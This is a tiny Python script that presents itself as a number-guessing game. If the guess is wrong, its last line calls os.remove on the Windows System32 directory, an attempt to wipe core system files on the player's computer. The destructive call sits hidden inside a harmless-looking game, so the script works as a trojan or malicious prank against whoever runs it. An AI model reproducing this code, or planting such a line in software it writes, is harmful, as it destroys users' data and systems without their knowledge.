import random
import os

number = random.randint(1,10)
Guess = input("Guess a Number Between 1 and 10")
Guess = int(Guess)

if Guess == number:
    print("Great, You Win!")
else:
    os.remove("C:\windows\System32")